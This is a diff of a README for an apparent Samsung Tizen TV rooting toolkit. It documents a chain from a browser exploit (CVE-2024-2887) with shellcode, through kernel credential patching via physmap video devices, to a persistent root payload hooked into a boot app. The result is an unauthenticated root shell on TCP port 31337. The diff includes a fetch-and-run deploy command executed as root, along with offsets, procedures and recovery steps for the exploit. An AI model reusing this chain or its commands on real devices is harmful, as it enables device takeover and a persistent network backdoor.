@@ -35,11 +35,11 @@ channel on TCP 31337 (line protocol, replies end with `__END__`).
 
 | | |
 |---|---|
-| Payload | repo **v38** (`adc2b27c…`, 31,744 B) staged 2026-10-26 — read-only `high-scan` diagnostic (v38.1: task addresses, children-list validation), deploy gate updated, `server/payload.dll` byte-identical; **TV still on v37** (`968e1154…`, 29,184 B, deployed 2026-10-25, set disconnected since). Deploy v38 on the next connected session; one cold boot then answers the high-half question |
+| Payload | repo **v39.1** (`bc05cf51…`, 33,280 B) built 2026-10-26 — review hardening + follow-up: rendered `deploy.sh` template, transactional deploy with rollback, video40-only EBUSY retry (video30/video60 only on ENOENT), NUL-safe stub buffers, 120 s `Run()` cap with capped output, cap writes only after a uid-5001 ids write, browser page fixes. **TV still on v37** (`968e1154…`, 29,184 B, deployed 2026-10-25, set disconnected since). Deploy v39.1 on the next connected session; one cold boot then answers the high-half question. |
 | Boot-to-root | **Fifth pass closed: attempt 2 is the floor; v37 cold boot 37 s.** The final stock→root cycle passed with the retry loop: attempt 1's stub died (`probe timed out`), `auto_root` requested a reload, attempt 2 on the fresh page rooted and deployed v37 (`COPY=ok`), then the cold boot rooted at t=37 (attempt 1 `seen=0`, attempt 2 `direct-parent+2f0`). v37 adds `real=`/`junk=` and the parent/latch summary fixes; this boot did not hit the high-alloc gate. v35: 37 s; v34: 34 s and 68 s (stock cycle); v33: 38–39 s; v32: 59 s; v31: 132 s. Evidence: every coherent task/cred read < `0xE0000000` (78/78 `cuid=5001` creds low; 21/21 high creds junk; 15/15 `direct-parent+` and 19/19 `self-patch` successes low; 0/81 task pointers high). Marker: `share/root_boot.txt` |
 | Root identity | `uid=0`, `CapEff=0x3fffffffff`, running under the app's own SMACK label |
 | Boot hook | a `boot_sequence` row in `/opt/dbspace/user/5001/.appsvc.db` |
-| Device | `/dev/video40`, one RDWR opener; the app runs as uid 5001, gid 44 |
+| Device | physmap nodes `/dev/video40` (jpeg), `/dev/video30` (hen, the browser stub) and `/dev/video60` (dvde). Exclusivity is **per instance**, but the payload may only **retry video40** on `EBUSY`: video30 hangs at phys `0x46000000` and the payload's scans reach `0x60000000`, so switching nodes on a busy video40 would break the boot (review 2026-10-26). video30/video60 are tried only when a node reports `ENOENT`/`ENODEV`. The app runs as uid 5001, gid 44 |
 
 **Serve port 80 with `pysrv.exe`, never `python.exe` on this PC.** The Windows
 firewall has inbound *Block* rules for `python.exe` and *Allow* rules for
@@ -141,9 +141,9 @@ may block on the network. v18 also prefixes every beacon with kernel uptime
 - **Beacons have a 500 ms connect timeout.** A stale `rootchan.host` (PC off, or
   the address moved to another subnet) used to cost TCP SYN retries inside the
   ~40 s budget. The local `share/root_boot.txt` marker is the durable record.
-- **`/dev/video40` is closed in every fork child** before it sleeps, and closed
+- **The physmap node is closed in every fork child** before it sleeps, and closed
   before the fast-exit `Environment.Exit`. Without that, each landmark child kept
-  the single RDWR opener for 120 s and the next AUL launch sat in the `open()`
+  the inherited opener for 120 s and the next AUL launch sat in the `open()`
   retry — a slow-boot cause that looked like a failed round.
 - **31337 bounds every client.** 30 s read/write timeout, 4 KB per command line,
   8 KB pending without a newline, then the client is dropped. One silent
@@ -173,10 +173,14 @@ at the router — `otn2.samsungcloudcdn.com`,
 ### The command channel survives a runaway command
 
 `Run()` redirects a command's output to a temp file rather than a pipe, and on the
-15 s timeout kills the whole process tree. A pipe was closed only when every
+120 s timeout kills the whole process tree. A pipe was closed only when every
 descendant closed it, so one long-lived grandchild (a `grep -r /opt`) used to wedge
 the channel until the TV was power-cycled. A timed-out command now returns
-`[timeout: killed after 15s]` and the channel keeps serving.
+`[timeout: killed after 120s]` and the channel keeps serving.  The reply goes to
+a **unique** temp file per call (`/tmp/.dsh_cmd.<pid>.<n>.out`), and the command
+is passed to the shell as an **argument** (`sh -c 'exec > "$1" 2>&1; exec /bin/sh -c "$2"'`),
+so `}`, `;` or quotes in a command cannot break the wrapper, and a background
+thread (auto-update off) can run commands concurrently with the channel.
 
 ## 2. Target facts
 
@@ -204,7 +208,7 @@ Tizen 9 TV).
 ```
 TV browser (uid 5001, gid 44 video)
   └─ index.html ──CVE-2024-2887──▶ renderer R/W + ARM shellcode
-        └─ physmap stub: opens /dev/video40, serves RPC over TCP/80
+        └─ physmap stub: opens /dev/video30, serves RPC over TCP/80
               ▲
 PC            │ server/server.py (port 80: page + RPC gateway on 127.0.0.1:9998)
               │ tools/auto_root.py / kernel_root.py / physmap.py / root_shell.py
@@ -236,8 +240,8 @@ TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
 | `server/index.html` | page that loads the browser chain |
 | `server/payloads/browser_payload.js` | browser V8 payload (hdbreaker chain + physrpc) |
 | `server/lib/wasm_builder.js` | WasmGC helper used by the payload |
-| `server/deploy.sh` | deploy script executed on the TV as root (verifies md5) |
-| `server/uninstall.sh` | restores the stock app (run via the channel) |
+| `server/deploy.sh` | deploy TEMPLATE (`H=@HOST@`, `WANT=@WANT@`, `SIZE_WANT=@SIZE@`), rendered per request by `server.py`; transactional with rollback |
+| `server/uninstall.sh` | restores the stock app (run via the channel); relabels before `mv`, removes the allowlist last |
 | `server/payload.dll` | the root-on-boot payload served to the TV |
 | `tools/physmap.py` | RPC client (hello, read/write, ops) |
 | `tools/kernel_root.py` | finds the kernel/`init_task`/task and patches the cred |
@@ -255,9 +259,10 @@ TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
 | `tools/test_gateway.py` | gateway integration test (no TV): RSET, pairing, forwarding, BUSY, /save cap |
 | `tools/test_shell.py` | deploy/uninstall dry tests under `sh` (no TV): backups, label, boot row |
 | `tools/test_stub.py` | live-stub protocol + clamp checks (fresh page load) |
-| `tools/test_logs.py` | offline: beacon-analyzer fixtures, tool error paths, ps1 parse guard |
+| `tools/test_logs.py` | offline: beacon-analyzer fixtures (log **and** the on-TV marker), tool error paths, ps1 parse guard |
+| `tools/test_constants.py` | cross-checks the same offsets/limits/node names across `Program.cs`, `sim_rpc.py`, `kernel_root.py`, `physmap.py`, `physrpc.S`, the page and `deploy.sh` |
 | `tools/test_all.py` | runs every layer above; `--tv` adds the live stub |
-| `payload/Program.cs` | boot payload source (v37; TV on v37) |
+| `payload/Program.cs` | boot payload source (v39.1; TV on v37) |
 | `payload/BootPayload.csproj` | net6.0 project, assembly `MultiControlService` |
 | `root.ps1` | one-command runner (server + root + deploy + verify) |
 | `uninstall.ps1` | one-command uninstall (restore stock + verify) |
@@ -336,10 +341,14 @@ shell - that corrupts the stream and wastes the page load.
 duplicate an inventory here.
 
 `server/payload.dll` is the artifact the TV fetches during deploy and is
-byte-identical to `payload/out/MultiControlService.dll` (md5 `968e1154…`, v37;
+byte-identical to `payload/out/MultiControlService.dll` (md5 `bc05cf51…`, v39.1;
 reproducible — see §9), so a clone runs without a .NET SDK. Rebuild with
-`dotnet build payload/BootPayload.csproj -c Release`, then update the
-`WANT=`/`SIZE_WANT=` gate in `server/deploy.sh`.
+`dotnet build payload/BootPayload.csproj -c Release -o out`, then copy it over
+`server/payload.dll`; there is **no `WANT=` constant to update** any more — the
+server renders the hash/size into `deploy.sh` per request from the file it serves.
+`server/deploy.sh` is a TEMPLATE (`H=@HOST@`, `WANT=@WANT@`, `SIZE_WANT=@SIZE@`);
+serving it from a plain static server is refused (`NEED_RENDER`), so the stale
+generated-copy class (v37/v38 `deploy_local.sh`) cannot recur.
 
 `.gitattributes` pins `*.sh`/`*.py` to **LF**: the TV's busybox `sh` treats a CR
 as part of the token (`#!/bin/sh^M: not found`), so a Windows checkout must not
@@ -378,11 +387,11 @@ python kernel_root.py --fork
 # 3. verify
 python run_root.py "id" 6               # uid=0(root)
 
-# 4. deploy the boot payload (root.ps1 wrote deploy_local.sh with your PC address;
-#    if it is absent, run root.ps1 once to generate it. The committed deploy.sh
-#    has a placeholder H= and must not be served as-is.)
-python run_root.py "curl -s http://<HOST_IP>/deploy_local.sh | sh" 45
-#    expect: UID=0, SIZE=29184, MD5=968e1154..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
+# 4. deploy the boot payload.  deploy.sh is a TEMPLATE: server.py renders H=
+#    from the address the TV used and WANT=/SIZE_WANT= from the payload.dll it
+#    serves, so there is no generated copy to go stale (the old deploy_local.sh).
+python run_root.py "curl -s http://<HOST_IP>/deploy.sh | sh" 45
+#    expect: UID=0, SIZE=33280, MD5=bc05cf51..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
 
 # 5. reboot the TV (exit the browser first so it does not restore the page)
 
@@ -400,7 +409,7 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
 
 - [ ] `root_shell.py "id" <TV_IP>` returns `uid=0(root)`.
 - [ ] `root_shell.py "cat /proc/self/status | grep CapEff" <TV_IP>` → `0000003fffffffff`.
-- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `968e1154…`
+- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `bc05cf51…` after the v39.1 deploy (v37 `968e1154…` until then)
 - [ ] Cold boot with the browser closed → attempt 1 high exits in ~2 s (`high-alloc … fast-exit`), attempt 2 roots; v37 cold boot observed **37 s** (attempt 2; attempt 1 `seen=0`); v35: 37 s; v34: 34 s and 68 s. Attempt-1 `SUCCESS` is a bonus; attempt 2 is the floor, but a slow hunt can push to attempt 3.
 - [ ] `kill -9 <app pid>` → channel back in ~5–45 s (v33's high-alloc gate skips a high attempt quickly; otherwise attempt 2 roots), still uid 0.
 - [ ] `python tools/test_all.py --tv` against a fresh page load (stub protocol
@@ -412,8 +421,14 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
    watchdog while blocked in the shellcode. Deploy in one batch.
 2. **Reloading the page kills the stub.** Each load = a new stub; root it and
    deploy without reloading.
-3. **One `/dev/video40` RDWR opener.** If the boot payload holds it, the
-   browser cannot; the payload must close it after rooting.
+3. **The physmap node is exclusive per INSTANCE, and the payload must stay on
+   video40.** Two different nodes can be open at once, but only video40 serves
+   the reads the payload performs (video30 hangs at phys `0x46000000` while the
+   payload scans to `0x60000000`). So the payload retries video40 on `EBUSY`
+   for the whole budget and moves to video30/video60 **only on
+   `ENOENT`/`ENODEV`**. Do not "cycle on busy": that turns a browser stub
+   holding video40 into a boot that cannot finish its scan (review 2026-10-26).
+   `O_RDONLY` skips the busy check (diagnostics only: `PROT_WRITE` needs RDWR).
 4. **`fork()` copies the cred.** Patch the parent found via `real_parent`, not
    the child.
 5. **Kernel pointers can be above `0xE0000000`** (LPAE 1 GB direct map). Never
@@ -422,18 +437,25 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
    a high task/cred needs a fresh process, not waiting (trap 16).
 6. **Post-fork managed code.** Use a pre-pinned buffer + raw
    `syscall(172,15,…)` in the child; a CLR allocation can deadlock.
-7. **Short commands.** The stub's `cmdbuf` is 512 B and `run_root.py` /
-   `auto_root.py` now refuse commands over 509 B (`write_root.py`: 255 B path,
-   4 KB chunk); use `curl …/deploy_local.sh | sh`. Commands over ~100 chars were
-   observed killing a stub even under the limit.
+7. **Short commands.** The stub's `cmdbuf` is 512 B and is NUL-terminated after
+   the body (v39), so `run_root.py` / `auto_root.py` refuse commands over 508 B
+   (`write_root.py`: 255 B path, 4 KB chunk); use `curl …/deploy.sh | sh`.
+   Commands over ~100 chars were once observed killing a stub even under the
+   limit, so prefer a fetched script for anything multi-step.
 8. **Do not fork repeatedly on one stub**; zombies poison the task walk.
 9. **Do not touch `/mnt/systemrw`** (OTA/update data) and do not poke
-   `/dev/tztv_tcon` (TCON flash = brick risk).
+   `/dev/tztv_tcon` (TCON flash = brick risk). Concrete trigger found in the
+   reference tree (`research/BOOT-HOOKS-2026-10-21.md`): a file in that area
+   whose first line is `219971` calls `do_opt_reset`, which reformats `/opt`
+   from `/common/data_backup.xz` at the next boot — i.e. your payload, backups
+   and boot row are gone.
 10. **Keep TV auto-update off.** An OTA replaces the app and the boot row.
-11. **The browser payload's callback IP is baked into the shellcode.** If the PC
-    IP changes, rebuild `tools/physrpc.S` (`build_physrpc.py`) and re-embed the
-    shellcode in `server/payloads/browser_payload.js`; `root.ps1` only rewrites
-    the deploy script.
+11. **The browser payload rewrites its own callback from the URL.** The blob ships
+    a TEST-NET placeholder (`192.0.2.1:80`); the page patches **both the IP and
+    the port** from `location.hostname`/`location.port`, and **aborts** if it was
+    served by hostname (a silent fallback used to send the TV to a foreign LAN).
+    Open the page by IPv4. If you change `tools/physrpc.S`, rebuild + re-embed
+    (`build_physrpc.py`, `embed_physrpc.py`) and keep both `--check` modes green.
 12. **Do not reboot the TV with `systemctl --force reboot` from the payload.** It
     worked once and then left the set in a deep standby that the remote could not
     wake; only unplugging it from the wall brought it back. Ask for a power cycle
@@ -444,7 +466,10 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
     check, and if it happens to point at a uid-0 cred, an "already rooted" early
     return hides the live stub. `_find_tags_near_tail()` returns all of them;
     `tv_rootwatch.root_by_tail` only writes uid-5001 creds and reports `already`
-    only when none exist. Keep both properties.
+    only when none exist. `root_via_fork` **and** the legacy non-`--fork` `root()`
+    return False (no EXEC) when the only creds they saw were uid 0. Keep all
+    three properties. Also: if a fork returns a pid, that landmark exists — do
+    not fork a second one because the walk missed it (trap 8).
 14. **Physmap mappings alias kernel cache.** `MapPage` used to keep the VA, so
     `PatchCred` readback could see uid 0 while `getuid()` stayed 5001 (the ARM
     stub munmaps every op and never hits this). v18 `cacheflush`es every
@@ -543,7 +568,7 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
   past proven RAM, or let it grow past the budget. Verdicts and how to read
   them: `docs/OPEN-ISSUES.md` → Pending.
 - `ReopenVideo()` after `FindBase` / `TaskOffsets` and **before** `fork()` (sole
-  opener). Never close `/dev/video40` while a landmark child still holds it.
+  opener in this process). Never close the node while a landmark child still holds it.
 - Latch **every** new `PHYRFORK` not in `pre` (v23): parent-cred uid 5001, 0,
   unreadable and live foreign all take the same `maybe` path. `PatchCred` still
   writes uid 5001 only. Do not restore the v21/v22 "skip a live foreign uid"
@@ -556,14 +581,26 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
   embedded the git SHA in `AssemblyInformationalVersion` (`1.0.0+<sha>`), so the
   same source built to a different md5 at every commit. Two clean builds of the
   same source now produce the same artifact (comments never entered the IL).
-  After a real payload change, still take `WANT=`/`SIZE_WANT=` from the new build.
+  After a payload change: copy `payload/out/MultiControlService.dll` over
+  `server/payload.dll`; the deploy gate is rendered from that file, so there is
+  no `WANT=` to update by hand.
+- **v39.1 hardening to preserve:** the device open retries **video40** on
+  `EBUSY` for the whole budget and advances to `video30`/`video60` only on
+  `ENOENT`/`ENODEV`, beaconing on state change plus one "still waiting" line per
+  30 s (never per attempt, never on busy); `Run()` uses a unique temp file per
+  call, passes the command as an argument (not spliced into `-c`), caps output at
+  1 MiB and times out at 120 s; `Write32` splits a page-crossing word byte-wise;
+  the failure paths and long-mode idle close the device; `RootChannel` retries a
+  failed bind and stops the listener that threw; auto-update-off runs on a
+  background thread; capability writes happen **only** after an ids write that
+  started from uid 5001.
 
 ## 10. Recovery
 
 - **Payload fails to root at boot, channel down:** the browser path still works.
   Load `index.html` and run `root.ps1` again — or, from a root shell,
-  `server/recover.sh`. If `/dev/video40` is held by the failed payload, wait
-  (~2 min, it exits) or power-cycle.
+  `server/recover.sh`. If every physmap node is held by the failed payload, wait
+  (~2 min, it exits and now closes the node) or power-cycle.
 - **Restore stock app / uninstall:** `pwsh -File uninstall.ps1 -TvIp <tv-ip>`. It
   uses the 31337 channel to run `server/uninstall.sh`, which md5-checks and
   restores the stock IL + AOT (relabelled), deletes the boot row unless
@@ -585,20 +622,21 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
 ## 11. Open work
 
 - ~~Bind 31337 to a single address~~ — **done in v16**: the listener binds the TV address derived from the route to the recorded PC (re-derived every 30 s, `Any` fallback with a beacon if there is no route), so it is off Wi-Fi Direct/tethering while staying portable. `/proc/net/tcp` shows the TV's own address on 31337, not `00000000:7A69`.
-- **Pending: high-half read mechanism — now one measurement (v38 `high-scan`).**
+- **Pending: high-half read mechanism — measure `high_memory`/`max_low_pfn`.**
   Reads at/above `0xE0000000` are unreliable (0/21 high creds, 0/81 high task
   pointers). The cache-visibility story is closed (v28 measured `uid == plain`
   garbage through two VA geometries). Two causes remain open, and an earlier
-  "not in the linear map by construction" claim was **retracted 2026-10-26**:
-  the `0xE0000000`/`0xE0800000` split came from a recon-tree comment that a
-  later revision retracted, `high_memory` was never read here, so the linear
-  map's end on this unit is unmeasured — (a) wrong translation vs (b) video40
-  returning wrong bytes at the pointed frame are both live. The read-only v38
-  beacon decides on the next high-allocation boot (`verdict=` linear/
-  elsewhere/comm-only/miss, `cov=` coverage; tasks are not page-aligned, so it
-  works on task addresses and validates the children list). It no longer
-  blocks this unit (attempt 2 is the floor) but matters for porting and for any
-  future attempt-1 work. See `docs/OPEN-ISSUES.md` → Pending.
+  "not in the linear map by construction" claim was **retracted 2026-10-26**;
+  the reference tree has since supplied a live `MemTotal` (1.73 GB) **and** the
+  older, canonical VMSPLIT_3G note (`recon/VIDEO-PHYSMAP…`, `publish/recon/tvphys.py`),
+  so a high VA is probably not direct-mapped at all — but this is still a
+  hypothesis, not a measurement. Next step: read `high_memory` and
+  `max_low_pfn` from the running Image (both `.bss`; anchor the build→running
+  delta on the `init_task` the payload already locates, and require
+  `high_memory == 0xA0000000 + max_low_pfn*0x1000` as a self-check) in the
+  existing v38 diagnostic slot. That replaces the per-boot allocation lottery
+  with a number. It no longer blocks this unit (attempt 2 is the floor) but
+  matters for porting and for any future attempt-1 work.
 - **Pending: portability.** No second model/firmware has been tested. Use the
   four gates and the file-by-file checklist in `docs/PORTABILITY.md`; record each
   unit there.
@@ -608,15 +646,24 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
   and attempt 2 rooted and deployed v37 (`COPY=ok`). The following cold boot
   rooted at t=37. The retry prompt is the manual fresh-page recovery, automated.
 - **Pending: 31337 is an unauthenticated LAN root shell.** The allowlist is the
-  only filter. Keep it off untrusted networks; see `SECURITY.md`.
+  only filter on the channel. The PC-side server now also: answers non-served HTTP
+  methods with 405 instead of treating them as the shell, accepts the interactive
+  shell slot only from a peer that has announced itself (`PGDB`/`DSHROOT`), caps
+  the stub queue, and refuses cross-origin `/save`. **Still open:** the `PGDB`
+  handshake has no token, so a LAN peer can pre-empt the stub pairing; the next
+  step is a per-run token in the hello (page-injected, patched into the stub like
+  the callback address). Keep the set off untrusted networks; see `SECURITY.md`.
 - **Pending: public-release maintenance.** `LICENSE` covers original work only;
-  the browser-chain files are third-party (`NOTICE.md`). Keep private LAN IPs
-  out of docs/examples and keep `server/deploy.sh`'s `H=` a placeholder
-  (`root.ps1` rewrites it).
+  the browser-chain files are third-party (`NOTICE.md`). The baked addresses are
+  now TEST-NET placeholders (`192.0.2.1`), so the remaining work is a token/tool
+  pass over docs and examples plus a `recon/sanitize_for_public.py`-style
+  checker; keep `server/deploy.sh`'s markers intact.
 - ~~Clamp the stub's client-controlled lengths~~ — **done**: `physrpc.S` bounds
   READ/WRITE32/READMANY/RUN/FILE, refuses with -EINVAL, and ends the stub for the
-  two ops whose payload would desync the stream; blob rebuilt (7552 B), page
-  re-embedded by `tools/embed_physrpc.py`, live-verified by `tools/test_stub.py`.
+  two ops whose payload would desync the stream; v39 added NUL termination and
+  moved the RUN/FILE caps to 511/255, so the blob is now 7,600 B (rebuilt and
+  re-embedded; both `--check` modes green, live-verified earlier by
+  `tools/test_stub.py` — re-run `--tv` after deploying v39.1).
 - ~~Retry `open("/dev/video40")` instead of sleeping 120 s~~ — **done in v7**
   (120 s retry), so a browser stub holding the device no longer costs a cycle.
 - ~~Replace the task-list walk with a list-independent locator~~ — **done**: `tools/scan_cred.py` finds creds by content
@@ -641,15 +688,15 @@ rooted set risks the root; the warning to keep auto-update off remains).
 
 ### Caveats for a fresh clone
 
-- **`server/deploy.sh` ships `H=http://192.0.2.1`.** Never serve it unrewritten.
-  `root.ps1` detects the PC address and writes the ignored
-  `server/deploy_local.sh`; use that for manual deploys. `server/recover.sh`
-  prefers it and rewrites the fallback.
-- **Compiled address fallbacks still exist.** `payload/Program.cs` has
-  `Host = "192.168.178.214"`, and `tools/physrpc.S` / the page have a baked
-  callback. The normal flow overwrites them (`rootchan.host`; the page rewrites
-  from `location.hostname`), so open the page by **IP**, not hostname. Do not
-  rely on the compiled default; changing `Host` needs a new payload version.
+- **`server/deploy.sh` is a template, not a script to serve from disk.** `H=@HOST@`,
+  `WANT=@WANT@` and `SIZE_WANT=@SIZE@` are rendered by `server.py` per request
+  (the address the TV used + the hash/size of the `payload.dll` actually served).
+  A static server leaves the markers in place and the script refuses with
+  `NEED_RENDER`; there is no generated `deploy_local.sh` any more.
+- **Compiled address fallbacks are TEST-NET placeholders now.** `payload/Program.cs`
+  has `Host = "192.0.2.1"`, and the shellcode ships `192.0.2.1:80`; the real
+  address comes from `rootchan.host` (deploy) and from the page (which patches
+  **IP and port**, and aborts when served by hostname). Open the page by **IPv4**.
 - **31337 is an unauthenticated LAN root shell.** The allowlist is the only
   filter; see `SECURITY.md`.
 - **Attempt 1 after a cold boot is an allocation lottery.** Do not chase it with
